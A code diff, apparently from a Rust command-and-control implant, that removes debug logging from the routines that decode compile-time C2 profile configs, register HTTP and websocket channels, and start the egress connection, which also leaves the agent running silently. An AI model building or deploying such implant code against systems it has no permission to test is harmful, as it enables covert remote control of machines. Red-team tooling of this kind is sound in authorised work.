@@ -86,9 +86,7 @@ pub fn initialize() {
     use base64::engine::general_purpose::STANDARD as BASE64;
     use base64::Engine;
 
-    eprintln!("[agent] profiles::initialize() entered");
     let egress_order_b64 = get_egress_order_b64();
-    eprintln!("[agent] EGRESS_ORDER b64 = {:?}", egress_order_b64);
     let egress_order_bytes = match BASE64.decode(&egress_order_b64) {
         Ok(b) => b,
         Err(e) => {
@@ -100,12 +98,9 @@ pub fn initialize() {
     let order: Vec<String> = match serde_json::from_slice(&egress_order_bytes) {
         Ok(o) => o,
         Err(e) => {
-            eprintln!("[agent] FATAL: Failed to parse connection orders: {}", e);
             return;
         }
     };
-    eprintln!("[agent] Egress order: {:?}", order);
-
     {
         let mut egress = EGRESS_ORDER.write().expect("Egress order lock");
         *egress = order.clone();
@@ -126,10 +121,7 @@ pub fn initialize() {
 
     // Register C2 profiles from compile-time config env vars
     // Each env var is base64-encoded JSON set by builder.go during payload build
-    eprintln!("[agent] Registering profiles from config...");
     register_profiles_from_config(&BASE64);
-    let profile_count = AVAILABLE_C2_PROFILES.read().expect("lock").len();
-    eprintln!("[agent] {} profiles registered", profile_count);
 }
 
 /// Decode a base64 config string and deserialize into the target type
@@ -141,24 +133,17 @@ fn decode_profile_config<T: serde::de::DeserializeOwned>(
     use base64::Engine;
 
     let cleaned: String = b64_config.chars().filter(|c| !c.is_whitespace()).collect();
-    eprintln!("[agent] decode_profile_config({}) b64 len={} (cleaned from {})", profile_name, cleaned.len(), b64_config.len());
     let bytes = match BASE64.decode(&cleaned) {
-        Ok(b) => {
-            eprintln!("[agent] decode_profile_config({}) decoded {} bytes: {}", profile_name, b.len(), String::from_utf8_lossy(&b));
-            b
-        }
+        Ok(b) => b,
         Err(e) => {
-            eprintln!("[agent] FAIL: base64 decode {} config: {}", profile_name, e);
+            log::error!("Failed to decode {} config: {}", profile_name, e);
             return None;
         }
     };
     match serde_json::from_slice(&bytes) {
-        Ok(config) => {
-            eprintln!("[agent] decode_profile_config({}) JSON parse OK", profile_name);
-            Some(config)
-        }
+        Ok(config) => Some(config),
         Err(e) => {
-            eprintln!("[agent] FAIL: JSON parse {} config: {}", profile_name, e);
+            log::error!("Failed to parse {} config: {}", profile_name, e);
             None
         }
     }
@@ -166,22 +151,11 @@ fn decode_profile_config<T: serde::de::DeserializeOwned>(
 
 /// Register all C2 profiles that have compile-time configuration
 fn register_profiles_from_config<E: base64::Engine>(_engine: &E) {
-    eprintln!("[agent] C2_HTTP_INITIAL_CONFIG present: {}", option_env!("C2_HTTP_INITIAL_CONFIG").is_some());
-    eprintln!("[agent] C2_WEBSOCKET_INITIAL_CONFIG present: {}", option_env!("C2_WEBSOCKET_INITIAL_CONFIG").is_some());
-    eprintln!("[agent] C2_DYNAMICHTTP_INITIAL_CONFIG present: {}", option_env!("C2_DYNAMICHTTP_INITIAL_CONFIG").is_some());
-    eprintln!("[agent] AGENT_UUID = {:?}", option_env!("AGENT_UUID"));
-
     // HTTP profile
     if let Some(config_b64) = option_env!("C2_HTTP_INITIAL_CONFIG") {
-        eprintln!("[agent] HTTP config_b64 = {:?}", &config_b64[..std::cmp::min(config_b64.len(), 80)]);
         if let Some(config) = decode_profile_config::<http::HttpInitialConfig>(config_b64, "http") {
-            eprintln!("[agent] HTTP profile decoded, registering");
             register_available_c2_profile(Arc::new(http::HttpProfile::new(config)));
-        } else {
-            eprintln!("[agent] HTTP profile decode returned None!");
         }
-    } else {
-        eprintln!("[agent] C2_HTTP_INITIAL_CONFIG env var not set at compile time");
     }
 
     // Websocket profile
@@ -227,10 +201,8 @@ fn register_profiles_from_config<E: base64::Engine>(_engine: &E) {
 
 /// Start egress and P2P profiles
 pub async fn start() {
-    eprintln!("[agent] profiles::start() entered");
     let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
     let mut egress_order = EGRESS_ORDER.write().expect("Egress order lock");
-    eprintln!("[agent] profiles::start() - {} profiles, egress_order={:?}", profiles.len(), *egress_order);
 
     // Build installed C2 list: egress order first, then any extras
     let mut installed_c2 = Vec::new();
@@ -248,56 +220,25 @@ pub async fn start() {
 
     // Start first matching egress profile
     let current_id = CURRENT_CONNECTION_ID.load(std::sync::atomic::Ordering::Relaxed) as usize;
-    use std::io::Write;
-    let _ = write!(std::io::stderr(), "[agent] Looking for egress at idx {}\n", current_id);
-    let _ = std::io::stderr().flush();
-    let mut started_egress = false;
     for (i, egress_c2) in egress_order.iter().enumerate() {
-        let _ = write!(std::io::stderr(), "[agent]   egress[{}] = {:?}, is current={}\n", i, egress_c2, i == current_id);
-        let _ = std::io::stderr().flush();
         if i == current_id {
             if let Some(profile) = profiles.get(egress_c2) {
-                let _ = write!(std::io::stderr(), "[agent]   got profile, is_p2p={}\n", profile.is_p2p());
-                let _ = std::io::stderr().flush();
                 if !profile.is_p2p() {
-                    let _ = write!(std::io::stderr(), "[agent]   cloning arc...\n");
-                    let _ = std::io::stderr().flush();
-                    started_egress = true;
                     let p = profile.clone();
-                    let _ = write!(std::io::stderr(), "[agent]   spawning task...\n");
-                    let _ = std::io::stderr().flush();
                     tokio::spawn(async move {
-                        let _ = write!(std::io::stderr(), "[agent]   spawned task running\n");
-                        let _ = std::io::stderr().flush();
                         p.start().await;
                     });
-                    let _ = write!(std::io::stderr(), "[agent]   spawn returned\n");
-                    let _ = std::io::stderr().flush();
                     break;
                 }
-            } else {
-                eprintln!("[agent] Profile {:?} not in registered profiles!", egress_c2);
             }
         }
     }
-    if !started_egress {
-        eprintln!("[agent] WARNING: No egress profile was started!");
-    }
-
-    let _ = write!(std::io::stderr(), "[agent] dropping locks...\n");
-    let _ = std::io::stderr().flush();
 
     // Start all P2P profiles (skipping for now - none registered)
     drop(profiles);
-    let _ = write!(std::io::stderr(), "[agent] dropped profiles lock\n");
-    let _ = std::io::stderr().flush();
     drop(egress_order);
-    let _ = write!(std::io::stderr(), "[agent] dropped egress_order lock\n");
-    let _ = std::io::stderr().flush();
 
     // Wait forever
-    let _ = write!(std::io::stderr(), "[agent] waiting forever\n");
-    let _ = std::io::stderr().flush();
     let (_tx, mut rx) = mpsc::channel::<bool>(1);
     rx.recv().await;
 }
